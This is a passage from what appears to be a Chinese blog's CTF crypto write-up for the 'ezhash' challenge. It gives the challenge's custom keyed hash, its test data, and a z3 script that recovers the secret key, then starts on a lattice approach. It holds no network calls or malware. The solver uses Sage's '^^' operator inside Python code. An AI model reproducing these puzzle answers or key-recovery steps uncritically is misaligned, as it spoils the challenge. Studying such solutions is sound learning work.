class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<h1 id="3，ezhash？！"><a href="#3，ezhash？！" class="headerlink" title="3，ezhash？！"></a>3，ezhash？！</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shash</span>(<span class="params">value,key</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(value) == <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(key) == <span class="built_in">int</span></span><br><span class="line">    length = <span class="built_in">len</span>(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    mask = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">    x = (<span class="built_in">ord</span>(value[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span>) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> value:</span><br><span class="line">        x = (key * x) &amp; mask ^ <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line">    x ^= length &amp; mask</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_test</span>(<span class="params">key</span>):</span><br><span class="line"></span><br><span class="line">    testvalue = []</span><br><span class="line">    testhash = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        a = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">32</span>)) </span><br><span class="line">        testvalue.append(a)</span><br><span class="line">        testhash.append(shash(a,key))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> testvalue,testhash</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">str</span></span><br><span class="line">    key = getRandomInteger(<span class="number">128</span>)</span><br><span class="line">    testvalue,testhash = get_test(key)</span><br><span class="line">    shash = shash(flag,key)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;testvalue = &#x27;</span> + <span class="built_in">str</span>(testvalue) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;testhash = &#x27;</span> + <span class="built_in">str</span>(testhash) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;shash = &#x27;</span> + <span class="built_in">str</span>(shash) + <span class="string">&#x27;\n&#x27;</span>)        </span><br></pre></td></tr></table></figure>

<p>刚看到题目就想到了去年国赛的那道hash，去翻了翻发现还真是差不多，唯一的一点差别是这道题没给出key。那么我们咋求key呢。我们来看看shash和gettest函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shash</span>(<span class="params">value,key</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(value) == <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(key) == <span class="built_in">int</span></span><br><span class="line">    length = <span class="built_in">len</span>(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    mask = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">    x = (<span class="built_in">ord</span>(value[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span>) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> value:</span><br><span class="line">        x = (key * x) &amp; mask ^ <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line">    x ^= length &amp; mask</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_test</span>(<span class="params">key</span>):</span><br><span class="line"></span><br><span class="line">    testvalue = []</span><br><span class="line">    testhash = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        a = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">32</span>)) </span><br><span class="line">        testvalue.append(a)</span><br><span class="line">        testhash.append(shash(a,key))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> testvalue,testhash</span><br></pre></td></tr></table></figure>

<p>我们可以发现testhash是key和 testvalue经过shash运算得到的结果。那么很明显啦，z3神力！使用一组test就能得到key。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, binascii</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入数据（替换为实际数据）</span></span><br><span class="line">testvalue = [<span class="string">&#x27;tx4QYfj3lCTABrCoMsh3PPvQIM7dmIIw&#x27;</span>, <span class="string">&#x27;jKLrKVRVpjjyrchL41IjMVkQMgSkyyig&#x27;</span>, <span class="string">&#x27;fdbfg4185rfRJyhwCwc2flhmsCDuVOe8&#x27;</span>, <span class="string">&#x27;ZL8h1XOKVNXkVh1ZcCHhDUvF4FO96139&#x27;</span>, <span class="string">&#x27;HcDKLC1iMwoiWoGxaC5VNC78VHLt5JOI&#x27;</span>, <span class="string">&#x27;GzGJsONsN8GSZxh6C89w0nzRiTaR3tkj&#x27;</span>, <span class="string">&#x27;Qcc9vqEBGXYd8sZ3E94Ode6ChC3U53x7&#x27;</span>, <span class="string">&#x27;kABKm4mE7AttOzac3eBXvIxKE9Ve0viT&#x27;</span>, <span class="string">&#x27;IkxnSW31AuUGpVldXGopAxfzr5eTXc2u&#x27;</span>, <span class="string">&#x27;rJ2LZ0uDPCWEwJzaGGalaWWHBbxrLH4h&#x27;</span>, <span class="string">&#x27;bOlXdB5xVb2RQO0MAhLvzgOZpEo2hIdP&#x27;</span>, <span class="string">&#x27;gRhoDgyxFFV5kBLwZxexhoHNd5BD81UE&#x27;</span>, <span class="string">&#x27;Ij86fy7zhVOaapV76xI71IUC8utF6Ct6&#x27;</span>, <span class="string">&#x27;T055KPGIWKhNIEPxAKW4MLMbmWDvEnLb&#x27;</span>, <span class="string">&#x27;SQSSYTFryov8Bp1ckfjbUTTV8H3Z3Dr7&#x27;</span>, <span class="string">&#x27;AzfvT7z8NXJ9u8ID6vgJ8Zml58F2k0iF&#x27;</span>, <span class="string">&#x27;o3nEYw9XaNzgetmmwypTU7oePU04Tkhc&#x27;</span>, <span class="string">&#x27;B44YjfhqOrlPg8XQJq2fhWEoGaCijfsc&#x27;</span>, <span class="string">&#x27;b7cvfUfjvorVjDBW6DiXrZc3eBqx98Ro&#x27;</span>, <span class="string">&#x27;9MwfbmLtdmRRt0TONZ4zmd6NN7z7V8Eg&#x27;</span>, <span class="string">&#x27;2f7I0f65nopjOpIZzErAoqYSGl0tMo0x&#x27;</span>, <span class="string">&#x27;PqvrJ3FmEuJh1ASIQ06RyYCXbe6426CY&#x27;</span>, <span class="string">&#x27;c3C60OTDrIs5ZChP2hTAYvViDw43ARCK&#x27;</span>, <span class="string">&#x27;D6a0NJ2JpwtTBCRJdw1DcXntMgRRyj2A&#x27;</span>, <span class="string">&#x27;gJ0rEL4zyy8A6aKZ1H3N46rsQnY6UGGx&#x27;</span>, <span class="string">&#x27;CD19v37d2jHu9YZMp20h70sm1Q3t1yOm&#x27;</span>, <span class="string">&#x27;7vt0C1SCNvPBqBm0YrJffbeLG8vS8388&#x27;</span>, <span class="string">&#x27;o2KRrZQJLD7CMuLzlPJoJHXwVOHEanBi&#x27;</span>, <span class="string">&#x27;Lm8I9m5ikXVrguEUFKw6yIc9QWnLwisx&#x27;</span>, <span class="string">&#x27;kt9H0IDCsjCfqkR83aHD8D23jXq55q5K&#x27;</span>, <span class="string">&#x27;HsXBVD2dMVTScHfgwAeNsqHkLCWuuaVn&#x27;</span>, <span class="string">&#x27;QnkXRLGjzfh16icAVidcW4kVx1LEOv0j&#x27;</span>, <span class="string">&#x27;29dQWe0QWOxNAhv48Lfnv8II4IZqeUh1&#x27;</span>, <span class="string">&#x27;E9Hj5zUhGXUfrNJRmhxF0KfBq0wSjX0i&#x27;</span>, <span class="string">&#x27;mEc57IdmvliXneKStFzb3pAnNNm4UHbh&#x27;</span>, <span class="string">&#x27;TvRZb6btVQeKXsO5iVuRCdz3A4ORZ5yQ&#x27;</span>, <span class="string">&#x27;yOfrPTw9Vkd0P7kiijnGVYL4SogWF7cY&#x27;</span>, <span class="string">&#x27;GNI7o11w4RyXYY2hnxdq1mAeVPrppkRc&#x27;</span>, <span class="string">&#x27;YCMxUi7OcB5xozjTg09xXbJvwM6U4apy&#x27;</span>, <span class="string">&#x27;0g6ItBFoe3174e7wpEaEgoid0rixLHBs&#x27;</span>, <span class="string">&#x27;bsyXlUGPUnQjoNwQLROwrA2SCkbDR1k5&#x27;</span>, <span class="string">&#x27;CMNSNW3fU14ibZgL0ifWrA0xbbq7Yrks&#x27;</span>, <span class="string">&#x27;VHfbRmzF9mzGCbYySdljWWo08IVCmAMZ&#x27;</span>, <span class="string">&#x27;SLfmmSZ5TjDc4ZfKIB2gOVf9KIH2jDUi&#x27;</span>, <span class="string">&#x27;YKTagkUhZjI0gMyaE1YjVJdCYtPGPZge&#x27;</span>, <span class="string">&#x27;kCVhCGvjedxC44BlTqQryGdMliYqYrIz&#x27;</span>, <span class="string">&#x27;HflxuwlJZ2rByOnv995gpXz03ZK6MLW2&#x27;</span>, <span class="string">&#x27;8Yy45IMlpMhDO3CFVhr5f0iRBnNuj3ut&#x27;</span>, <span class="string">&#x27;Ydae2l7kt1O6mCIBRwjr6TWn6fLRHXjf&#x27;</span>, <span class="string">&#x27;3cLGeEXfyLnrL0ZkvgSEAbDBYgaFNFxB&#x27;</span>, <span class="string">&#x27;97xOFim3lkwqrWM1BqQ7c8mYo5S5TxkC&#x27;</span>, <span class="string">&#x27;U1EgvNhZz3M8Hg38FsuBVG0PvuWiCfez&#x27;</span>, <span class="string">&#x27;1elLy7dgdfEtb2XyZMxaU6h8dGjfokjv&#x27;</span>, <span class="string">&#x27;FlSHFSs2SeKNOUVAprkHdtD2FrIPUGIR&#x27;</span>, <span class="string">&#x27;Bu1pVMZ5QqMmvBTdUt4IwsTpkclqwQKF&#x27;</span>, <span class="string">&#x27;BPzJvHHDTAu23xBS1wVButTF7lU0JGoo&#x27;</span>, <span class="string">&#x27;6xje2blSl3QwGeV9D4pUmxMKJDqpyXpt&#x27;</span>, <span class="string">&#x27;F2DkyxkRcHotO6i5MVUKzzDsxV2F69wh&#x27;</span>, <span class="string">&#x27;kvSYBqmZNppDfweere2A8co50Tv85c4m&#x27;</span>, <span class="string">&#x27;9k5gxX8oz1WmVLtCcN4SdFIse2FizYDU&#x27;</span>, <span class="string">&#x27;BJ2PCD5KgukjFWntZ3VSjcHJzIZprno2&#x27;</span>, <span class="string">&#x27;Lyw9EacIjF6j6de3e5wFRQLdzrOfQoAR&#x27;</span>, <span class="string">&#x27;egf9LJLJrWDIrtnsHZ4XRgoPTXNsz91a&#x27;</span>, <span class="string">&#x27;Y3ptIW83Rwtny4kng2lCEAYQyPrSIXWl&#x27;</span>]</span><br><span class="line">testhash = [<span class="number">139452903649273495774796570198749847935154848275416989998236609393670079561796026566</span>, <span class="number">1898315960650462382992557075551445244853390783794354772475023552166352399126801574913</span>, <span class="number">1548283380348601157365276865178627465508293067676981633220766480841355279423253644108</span>, <span class="number">923519463377078549688929962730292019193308698763374121309865664233390770048594933085</span>, <span class="number">1756902502089018688726236312608077708484907801835749190713532913735823397112051091188</span>, <span class="number">485883566823442644293538461674550566921074196968613685770142417532151624958507107972</span>, <span class="number">1173292014155884160226339046019271687659068020981556335907768031140876583959335792191</span>, <span class="number">1497598230931219654402725391331476099708291441530945577907300933091011484442911623559</span>, <span class="number">405254852716971084666570344588562007424273706832802434925282540786042396564117859893</span>, <span class="number">1394088214004563872208003758992014976825245306078851263986862009024422531466462221196</span>, <span class="number">1763510459716348629512798257958014024443432479861579028783119470126357343664438877507</span>, <span class="number">27569271776233701581922903599984775754217802504994237075390721310066121958700422257</span>, <span class="number">358721799072196562200934505713368644637409165736588969777736471282788507457480492393</span>, <span class="number">393768200956019495628870433474843666326783653588854234548113046584760291662872350533</span>, <span class="number">1807499005738194381232046747643492968233097104171420081977957810644000450496758434126</span>, <span class="number">1128375044917910760907836056160281710737671148936596789317429758098492329675588054412</span>, <span class="number">190801904376187850882600897701548299608718300961575858190394579710450430805489346060</span>, <span class="number">696235869802737571933351613461601576350495964954926712734858661433694663819119664403</span>, <span class="number">144629031178782625524039663692148786536912021223673544659451459599242746855791775856</span>, <span class="number">401144481698447351083363386545760097487182143265029898145794033656496473914256697335</span>, <span class="number">1009618288798575771577716476700225261222418219966898563557126734083036472365735018549</span>, <span class="number">1652157599124169823165290864340613818899678030477803381010155627950330279311151902666</span>, <span class="number">1870720516435595720338243705356357230346778004770545711499635272857342051185669675206</span>, <span class="number">1487151272734883591621339384743729579702945226647848932314811332859011211687393769612</span>, <span class="number">1479191883622650407012568261078896124452298448888937784127270669623167501587692263629</span>, <span class="number">780856915459110484827869192135025240964695263399685896704373351690074659693517658597</span>, <span class="number">1272702898194178848480618231703540760239057875392727193937165056708655804663623414520</span>, <span class="number">1275195323347307250910668562396243097983325652451465111552014287378408554253858874273</span>, <span class="number">1698673537783777278793781484130287999078310462163146951845044095951885080758156044986</span>, <span class="number">1116043791065172596267818286071095315966453133595258493434104767743854595678117184595</span>, <span class="number">1348107024738703857635485943338711096444282613588540975344171990396347335813147110414</span>, <span class="number">674079263421647723071324170291511267338891718494055820365382788749002205059725239586</span>, <span class="number">295061829951102865059369162125524442985720861319812067484094160955682413284464056261</span>, <span class="number">1538215242227433291697344636690665676070219615083515667029553094023114463154050936814</span>, <span class="number">721505087135717334627356208457079819823654955152265437431617001188458058923464437209</span>, <span class="number">1829121734506718678607427505722187801463532440435031915402835074237985549711879794153</span>, <span class="number">641638098138302116745154827833695010970508819483215023447636503844550651793330508318</span>, <span class="number">578773085269354102367810984562000052879291442293349350198300750627238557013515250567</span>, <span class="number">1037095172573176620769108515135124799537948207093565906631598569276504664097088051993</span>, <span class="number">1135701773556587743998667090148858666225101588783019121910187176364233349468967967460</span>, <span class="number">558240645642302963325581107204211662019896908316831899444935081810819489268610165950</span>, <span class="number">1058477746525469710567689847282850794170250650192794892415352733735415750154044535539</span>, <span class="number">1078948952548590509616082107408254715684287170445966544383750373684441181406075608800</span>, <span class="number">1125503915235599245173592373330463888468814720113318696411329986853859005519154551245</span>, <span class="number">620937641933659718470519231175003762666892925875327642171561741417944681106496958467</span>, <span class="number">1606192912497675735832389346699475593863960301930109653069662356606234973780336341534</span>, <span class="number">1080665036256326887412273484626209788664633047255179233142423471463514811554155351816</span>, <span class="number">983009583253660084055702843297933007090244160053834934015802835528599935867335658914</span>, <span class="number">483554778736863191047830758397092863562079726548422384268968936073701177390747179894</span>, <span class="number">1448392838363784830874780455853191313920717249664981009097361707739423512768919183176</span>, <span class="number">1485175804980546607220269493098915446350406205462077528986751407380405658199537322034</span>, <span class="number">645127338301455578293193215328875283422934699182904112612610112081929081505533458304</span>, <span class="number">1809012351380435986646710932772127842855528298763939575266488725018536037784342688529</span>, <span class="number">1204732789391044629328843397205785308919820285525150764490536624969971871178313643864</span>, <span class="number">577072907834194443039001358264806817627199891744275024388326836994220595931009773412</span>, <span class="number">4850110449540994875278068624822977611188629104877448016749725577673217396499782282</span>, <span class="number">1431458221917644050146055837804453915809781510516096707298405324221753990760039183190</span>, <span class="number">997966793625232984798176686099411790420209217223783698909939651134351713786805317998</span>, <span class="number">1663286211430268448119727051818073243067649643181675027323547282932628837598336996456</span>, <span class="number">1864894557154744961308146774304105483911867578158330607820790060568575114233028842003</span>, <span class="number">345822843952211153189889023070066136116424104740167243049994988868945364800740535124</span>, <span class="number">803699468991667968627856232995969437316168483382073633967569490433608395707635458855</span>, <span class="number">1700532832517222239684444041937412551935144886911006116260771516969538181780787023704</span>, <span class="number">351624945474123146509460066647337532150453362002844376810733781394757015795554947704</span>]</span><br><span class="line">enc = <span class="number">463802484547898091835999726502006552543022358314700124374789687370275467670717610329</span></span><br><span class="line">mask = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">mask_bits = <span class="number">280</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shash</span>(<span class="params">value,key</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(value) == <span class="built_in">str</span></span><br><span class="line">    <span class="comment">#assert type(key) == int</span></span><br><span class="line">    length = <span class="built_in">len</span>(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    mask = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">    x = (<span class="built_in">ord</span>(value[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span>) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> value:</span><br><span class="line">        x = (key * x) &amp; mask ^^ <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line">    x ^^= length &amp; mask</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 提取测试样本</span></span><br><span class="line">s = testvalue[<span class="number">0</span>]</span><br><span class="line">h = testhash[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 初始化Z3求解器</span></span><br><span class="line">solver = Solver()</span><br><span class="line">key = BitVec(<span class="string">&#x27;key&#x27;</span>, <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取测试样本</span></span><br><span class="line">solver.add(shash(s,key) == h)</span><br><span class="line"><span class="comment"># 求解密钥</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line">    key = model.<span class="built_in">eval</span>(key).py_value()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Recovered Key (hex): <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>造格的重点是把异或看作加或者是减去一个值，并且这个值在-255到255之间。详细的造格说明可以参考<a href="https://shinichicun.top/posts/ciscn2024-crypto/">CISCN2024-Crypto - Shin’s Blog</a>，这里不再过多赘述。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, binascii</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 输入数据（替换为实际数据）</span></span><br><span class="line">testvalue = [<span class="string">&#x27;tx4QYfj3lCTABrCoMsh3PPvQIM7dmIIw&#x27;</span>, <span class="string">&#x27;jKLrKVRVpjjyrchL41IjMVkQMgSkyyig&#x27;</span>, <span class="string">&#x27;fdbfg4185rfRJyhwCwc2flhmsCDuVOe8&#x27;</span>, <span class="string">&#x27;ZL8h1XOKVNXkVh1ZcCHhDUvF4FO96139&#x27;</span>, <span class="string">&#x27;HcDKLC1iMwoiWoGxaC5VNC78VHLt5JOI&#x27;</span>, <span class="string">&#x27;GzGJsONsN8GSZxh6C89w0nzRiTaR3tkj&#x27;</span>, <span class="string">&#x27;Qcc9vqEBGXYd8sZ3E94Ode6ChC3U53x7&#x27;</span>, <span class="string">&#x27;kABKm4mE7AttOzac3eBXvIxKE9Ve0viT&#x27;</span>, <span class="string">&#x27;IkxnSW31AuUGpVldXGopAxfzr5eTXc2u&#x27;</span>, <span class="string">&#x27;rJ2LZ0uDPCWEwJzaGGalaWWHBbxrLH4h&#x27;</span>, <span class="string">&#x27;bOlXdB5xVb2RQO0MAhLvzgOZpEo2hIdP&#x27;</span>, <span class="string">&#x27;gRhoDgyxFFV5kBLwZxexhoHNd5BD81UE&#x27;</span>, <span class="string">&#x27;Ij86fy7zhVOaapV76xI71IUC8utF6Ct6&#x27;</span>, <span class="string">&#x27;T055KPGIWKhNIEPxAKW4MLMbmWDvEnLb&#x27;</span>, <span class="string">&#x27;SQSSYTFryov8Bp1ckfjbUTTV8H3Z3Dr7&#x27;</span>, <span class="string">&#x27;AzfvT7z8NXJ9u8ID6vgJ8Zml58F2k0iF&#x27;</span>, <span class="string">&#x27;o3nEYw9XaNzgetmmwypTU7oePU04Tkhc&#x27;</span>, <span class="string">&#x27;B44YjfhqOrlPg8XQJq2fhWEoGaCijfsc&#x27;</span>, <span class="string">&#x27;b7cvfUfjvorVjDBW6DiXrZc3eBqx98Ro&#x27;</span>, <span class="string">&#x27;9MwfbmLtdmRRt0TONZ4zmd6NN7z7V8Eg&#x27;</span>, <span class="string">&#x27;2f7I0f65nopjOpIZzErAoqYSGl0tMo0x&#x27;</span>, <span class="string">&#x27;PqvrJ3FmEuJh1ASIQ06RyYCXbe6426CY&#x27;</span>, <span class="string">&#x27;c3C60OTDrIs5ZChP2hTAYvViDw43ARCK&#x27;</span>, <span class="string">&#x27;D6a0NJ2JpwtTBCRJdw1DcXntMgRRyj2A&#x27;</span>, <span class="string">&#x27;gJ0rEL4zyy8A6aKZ1H3N46rsQnY6UGGx&#x27;</span>, <span class="string">&#x27;CD19v37d2jHu9YZMp20h70sm1Q3t1yOm&#x27;</span>, <span class="string">&#x27;7vt0C1SCNvPBqBm0YrJffbeLG8vS8388&#x27;</span>, <span class="string">&#x27;o2KRrZQJLD7CMuLzlPJoJHXwVOHEanBi&#x27;</span>, <span class="string">&#x27;Lm8I9m5ikXVrguEUFKw6yIc9QWnLwisx&#x27;</span>, <span class="string">&#x27;kt9H0IDCsjCfqkR83aHD8D23jXq55q5K&#x27;</span>, <span class="string">&#x27;HsXBVD2dMVTScHfgwAeNsqHkLCWuuaVn&#x27;</span>, <span class="string">&#x27;QnkXRLGjzfh16icAVidcW4kVx1LEOv0j&#x27;</span>, <span class="string">&#x27;29dQWe0QWOxNAhv48Lfnv8II4IZqeUh1&#x27;</span>, <span class="string">&#x27;E9Hj5zUhGXUfrNJRmhxF0KfBq0wSjX0i&#x27;</span>, <span class="string">&#x27;mEc57IdmvliXneKStFzb3pAnNNm4UHbh&#x27;</span>, <span class="string">&#x27;TvRZb6btVQeKXsO5iVuRCdz3A4ORZ5yQ&#x27;</span>, <span class="string">&#x27;yOfrPTw9Vkd0P7kiijnGVYL4SogWF7cY&#x27;</span>, <span class="string">&#x27;GNI7o11w4RyXYY2hnxdq1mAeVPrppkRc&#x27;</span>, <span class="string">&#x27;YCMxUi7OcB5xozjTg09xXbJvwM6U4apy&#x27;</span>, <span class="string">&#x27;0g6ItBFoe3174e7wpEaEgoid0rixLHBs&#x27;</span>, <span class="string">&#x27;bsyXlUGPUnQjoNwQLROwrA2SCkbDR1k5&#x27;</span>, <span class="string">&#x27;CMNSNW3fU14ibZgL0ifWrA0xbbq7Yrks&#x27;</span>, <span class="string">&#x27;VHfbRmzF9mzGCbYySdljWWo08IVCmAMZ&#x27;</span>, <span class="string">&#x27;SLfmmSZ5TjDc4ZfKIB2gOVf9KIH2jDUi&#x27;</span>, <span class="string">&#x27;YKTagkUhZjI0gMyaE1YjVJdCYtPGPZge&#x27;</span>, <span class="string">&#x27;kCVhCGvjedxC44BlTqQryGdMliYqYrIz&#x27;</span>, <span class="string">&#x27;HflxuwlJZ2rByOnv995gpXz03ZK6MLW2&#x27;</span>, <span class="string">&#x27;8Yy45IMlpMhDO3CFVhr5f0iRBnNuj3ut&#x27;</span>, <span class="string">&#x27;Ydae2l7kt1O6mCIBRwjr6TWn6fLRHXjf&#x27;</span>, <span class="string">&#x27;3cLGeEXfyLnrL0ZkvgSEAbDBYgaFNFxB&#x27;</span>, <span class="string">&#x27;97xOFim3lkwqrWM1BqQ7c8mYo5S5TxkC&#x27;</span>, <span class="string">&#x27;U1EgvNhZz3M8Hg38FsuBVG0PvuWiCfez&#x27;</span>, <span class="string">&#x27;1elLy7dgdfEtb2XyZMxaU6h8dGjfokjv&#x27;</span>, <span class="string">&#x27;FlSHFSs2SeKNOUVAprkHdtD2FrIPUGIR&#x27;</span>, <span class="string">&#x27;Bu1pVMZ5QqMmvBTdUt4IwsTpkclqwQKF&#x27;</span>, <span class="string">&#x27;BPzJvHHDTAu23xBS1wVButTF7lU0JGoo&#x27;</span>, <span class="string">&#x27;6xje2blSl3QwGeV9D4pUmxMKJDqpyXpt&#x27;</span>, <span class="string">&#x27;F2DkyxkRcHotO6i5MVUKzzDsxV2F69wh&#x27;</span>, <span class="string">&#x27;kvSYBqmZNppDfweere2A8co50Tv85c4m&#x27;</span>, <span class="string">&#x27;9k5gxX8oz1WmVLtCcN4SdFIse2FizYDU&#x27;</span>, <span class="string">&#x27;BJ2PCD5KgukjFWntZ3VSjcHJzIZprno2&#x27;</span>, <span class="string">&#x27;Lyw9EacIjF6j6de3e5wFRQLdzrOfQoAR&#x27;</span>, <span class="string">&#x27;egf9LJLJrWDIrtnsHZ4XRgoPTXNsz91a&#x27;</span>, <span class="string">&#x27;Y3ptIW83Rwtny4kng2lCEAYQyPrSIXWl&#x27;</span>]</span><br><span class="line">testhash = [<span class="number">139452903649273495774796570198749847935154848275416989998236609393670079561796026566</span>, <span class="number">1898315960650462382992557075551445244853390783794354772475023552166352399126801574913</span>, <span class="number">1548283380348601157365276865178627465508293067676981633220766480841355279423253644108</span>, <span class="number">923519463377078549688929962730292019193308698763374121309865664233390770048594933085</span>, <span class="number">1756902502089018688726236312608077708484907801835749190713532913735823397112051091188</span>, <span class="number">485883566823442644293538461674550566921074196968613685770142417532151624958507107972</span>, <span class="number">1173292014155884160226339046019271687659068020981556335907768031140876583959335792191</span>, <span class="number">1497598230931219654402725391331476099708291441530945577907300933091011484442911623559</span>, <span class="number">405254852716971084666570344588562007424273706832802434925282540786042396564117859893</span>, <span class="number">1394088214004563872208003758992014976825245306078851263986862009024422531466462221196</span>, <span class="number">1763510459716348629512798257958014024443432479861579028783119470126357343664438877507</span>, <span class="number">27569271776233701581922903599984775754217802504994237075390721310066121958700422257</span>, <span class="number">358721799072196562200934505713368644637409165736588969777736471282788507457480492393</span>, <span class="number">393768200956019495628870433474843666326783653588854234548113046584760291662872350533</span>, <span class="number">1807499005738194381232046747643492968233097104171420081977957810644000450496758434126</span>, <span class="number">1128375044917910760907836056160281710737671148936596789317429758098492329675588054412</span>, <span class="number">190801904376187850882600897701548299608718300961575858190394579710450430805489346060</span>, <span class="number">696235869802737571933351613461601576350495964954926712734858661433694663819119664403</span>, <span class="number">144629031178782625524039663692148786536912021223673544659451459599242746855791775856</span>, <span class="number">401144481698447351083363386545760097487182143265029898145794033656496473914256697335</span>, <span class="number">1009618288798575771577716476700225261222418219966898563557126734083036472365735018549</span>, <span class="number">1652157599124169823165290864340613818899678030477803381010155627950330279311151902666</span>, <span class="number">1870720516435595720338243705356357230346778004770545711499635272857342051185669675206</span>, <span class="number">1487151272734883591621339384743729579702945226647848932314811332859011211687393769612</span>, <span class="number">1479191883622650407012568261078896124452298448888937784127270669623167501587692263629</span>, <span class="number">780856915459110484827869192135025240964695263399685896704373351690074659693517658597</span>, <span class="number">1272702898194178848480618231703540760239057875392727193937165056708655804663623414520</span>, <span class="number">1275195323347307250910668562396243097983325652451465111552014287378408554253858874273</span>, <span class="number">1698673537783777278793781484130287999078310462163146951845044095951885080758156044986</span>, <span class="number">1116043791065172596267818286071095315966453133595258493434104767743854595678117184595</span>, <span class="number">1348107024738703857635485943338711096444282613588540975344171990396347335813147110414</span>, <span class="number">674079263421647723071324170291511267338891718494055820365382788749002205059725239586</span>, <span class="number">295061829951102865059369162125524442985720861319812067484094160955682413284464056261</span>, <span class="number">1538215242227433291697344636690665676070219615083515667029553094023114463154050936814</span>, <span class="number">721505087135717334627356208457079819823654955152265437431617001188458058923464437209</span>, <span class="number">1829121734506718678607427505722187801463532440435031915402835074237985549711879794153</span>, <span class="number">641638098138302116745154827833695010970508819483215023447636503844550651793330508318</span>, <span class="number">578773085269354102367810984562000052879291442293349350198300750627238557013515250567</span>, <span class="number">1037095172573176620769108515135124799537948207093565906631598569276504664097088051993</span>, <span class="number">1135701773556587743998667090148858666225101588783019121910187176364233349468967967460</span>, <span 